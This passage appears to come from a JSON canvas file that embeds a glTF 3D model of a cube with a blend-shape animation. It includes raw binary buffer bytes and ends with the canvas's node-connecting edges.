1,\n\n\"bufferView\": 1,\n\n\"byteOffset\": 0\n\n},\n\n{\n\n\"componentType\": 5123,\n\n\"type\": \"SCALAR\",\n\n\"count\": 36,\n\n\"bufferView\": 2,\n\n\"byteOffset\": 0\n\n},\n\n{\n\n\"componentType\": 5126,\n\n\"type\": \"VEC3\",\n\n\"count\": 24,\n\n\"bufferView\": 3,\n\n\"byteOffset\": 0,\n\n\"min\": [\n\n-0.004999999888241291,\n\n-0.004999999888241291,\n\n-0.004999999888241291\n\n],\n\n\"max\": [\n\n0.004999999888241291,\n\n0.004999999888241291,\n\n0.004999999888241291\n\n]\n\n},\n\n{\n\n\"componentType\": 5126,\n\n\"type\": \"VEC3\",\n\n\"count\": 24,\n\n\"bufferView\": 4,\n\n\"byteOffset\": 0\n\n},\n\n{\n\n\"componentType\": 5126,\n\n\"type\": \"VEC2\",\n\n\"count\": 24,\n\n\"bufferView\": 5,\n\n\"byteOffset\": 0\n\n},\n\n{\n\n\"componentType\": 5126,\n\n\"type\": \"VEC3\",\n\n\"count\": 24,\n\n\"min\": [\n\n0.0,\n\n0.0,\n\n0.0\n\n],\n\n\"max\": [\n\n0.014999999664723873,\n\n0.0,\n\n0.0\n\n],\n\n\"sparse\": {\n\n\"count\": 12,\n\n\"indices\": {\n\n\"bufferView\": 6,\n\n\"byteOffset\": 0,\n\n\"componentType\": 5123\n\n},\n\n\"values\": {\n\n\"bufferView\": 7,\n\n\"byteOffset\": 0\n\n}\n\n},\n\n\"name\": \"blendShape1.pCube2\"\n\n}\n\n],\n\n\"samplers\": [\n\n{}\n\n],\n\n\"materials\": [\n\n{\n\n\"name\": \"lambert2\",\n\n\"doubleSided\": false,\n\n\"alphaMode\": \"OPAQUE\",\n\n\"extras\": {\n\n\"blendAlphaCutoff\": 0.55,\n\n\"fromFBX\": {\n\n\"shadingModel\": \"Lambert\",\n\n\"isTruePBR\": false\n\n}\n\n},\n\n\"pbrMetallicRoughness\": {\n\n\"baseColorFactor\": [\n\n0.4000000059604645,\n\n0.4000000059604645,\n\n0.4000000059604645,\n\n1.0\n\n],\n\n\"metallicFactor\": 0.20000000298023224,\n\n\"roughnessFactor\": 0.800000011920929\n\n}\n\n}\n\n],\n\n\"meshes\": [\n\n{\n\n\"name\": \"pCube1\",\n\n\"primitives\": [\n\n{\n\n\"material\": 0,\n\n\"mode\": 4,\n\n\"attributes\": {\n\n\"NORMAL\": 4,\n\n\"POSITION\": 3,\n\n\"TEXCOORD_0\": 5\n\n},\n\n\"indices\": 2,\n\n\"targets\": [\n\n{\n\n\"POSITION\": 6\n\n}\n\n]\n\n}\n\n],\n\n\"weights\": [\n\n0.0\n\n],\n\n\"extras\": {\n\n\"targetNames\": [\n\n\"blendShape1.pCube2\"\n\n]\n\n}\n\n}\n\n],\n\n\"animations\": [\n\n{\n\n\"name\": \"Take 001\",\n\n\"channels\": [\n\n{\n\n\"sampler\": 0,\n\n\"target\": {\n\n\"node\": 1,\n\n\"path\": \"weights\"\n\n}\n\n}\n\n],\n\n\"samplers\": [\n\n{\n\n\"input\": 0,\n\n\"interpolation\": \"LINEAR\",\n\n\"output\": 1\n\n}\n\n]\n\n}\n\n],\n\n\"nodes\": [\n\n{\n\n\"name\": \"RootNode\",\n\n\"translation\": [\n\n0.0,\n\n0.0,\n\n0.0\n\n],\n\n\"rotation\": [\n\n0.0,\n\n0.0,\n\n0.0,\n\n1.0\n\n],\n\n\"scale\": [\n\n1.0,\n\n1.0,\n\n1.0\n\n],\n\n\"children\": [\n\n1\n\n]\n\n},\n\n{\n\n\"name\": \"pCube1\",\n\n\"translation\": [\n\n0.0,\n\n0.0,\n\n0.0\n\n],\n\n\"rotation\": [\n\n0.0,\n\n0.0,\n\n0.0,\n\n1.0\n\n],\n\n\"scale\": [\n\n1.0,\n\n1.0,\n\n1.0\n\n],\n\n\"mesh\": 0\n\n}\n\n]\n\n}  �\u0003��BIN�����������\u0001�\u0002�\u0001���\u0003�\u0004�\u0005�\u0006�\u0007�\u0004�\u0006�\b�   �\n\n�\b�\n\n�\u000b�\f�\n\n�\u000e�\f�\u000e�\u000f�\u0010�\u0011�\u0012�\u0013�\u0011�\u0010�\u0014�\u0015�\u0016�\u0014�\u0016�\u0017�\n\nף�\n\nף�\n\nף�\n\nף�\n\nף;\n\nף;\n\nף�\n\nף;\n\nף�\n\nף�\n\nף�\n\nף;\n\nף;\n\nף�\n\nף;\n\nף;\n\nף�\n\nף�\n\nף;\n\nף;\n\nף�\n\nף;\n\nף;\n\nף;\n\nף;\n\nף�\n\nף;\n\nף�\n\nף�\n\nף;\n\nף�\n\nף�\n\nף�\n\nף;\n\nף�\n\nף�\n\nף;\n\nף�\n\nף�\n\nף�\n\nף�\n\nף�\n\nף�\n\nף;\n\nף�\n\nף;\n\nף;\n\nף�\n\nף�\n\nף;\n\nף;\n\nף;\n\nף;\n\nף�\n\nף�\n\nף;\n\nף�\n\nף;\n\nף;\n\nף;\n\nף;\n\nף;\n\nף;\n\nף�\n\nף;\n\nף;\n\nף�\n\nף�\n\nף;\n\nף;\n\nף�\n\nף;���������������������������������������������������?�����������?�����������?�����������?���������������������������������������������������������������������������������������������������������������?�����������?�����������?�����������?���������������?�����������?�����������?�����������?���>���?���>��@?���>��@?���>���?�� ?���?��`?���?��`?��@?�� ?��@?�� ?�������>�������>���>�� ?���>�� ?���>���>���>���>���?�� ?���?���>��@?�� ?���?���>���?�� ?��@?�� ?��@?���>��@?���>���?�� ?���?\u0004�\u0005�\u0006�\u0007�\b�\u000b�\f�\u000f�\u0011�\u0013�\u0014�\u0017���u<����������u<����������u<����������u<����������u<����������u<����������u<����������u<����������u<����������u<����������u<����������u<��������\n```"}
	],
	"edges":[
		{"id":"9ec00259a3766762","fromNode":"1095f032dab33a21","fromSide":"right","toNode":"b585ce80da396636","toSide":"left"},
		{"id":"a670a201478687cb","fromNode":"b585ce80da396636","fromSide":"right","toNode":"d924286ea19526ca","toSide":"left"},
		{"id":"2a122d452ee4773e","fromNode":"dba6063f7487e124","fromSide":"left","toNode":"13ddc15d9ea25907","toSide":"right"},
		{"id":"38d49519014b1116","fromNode":"26df2b3250165556","fromSide":"bottom","toNode":"92540545221ea288","toSide":"top"}
	]
}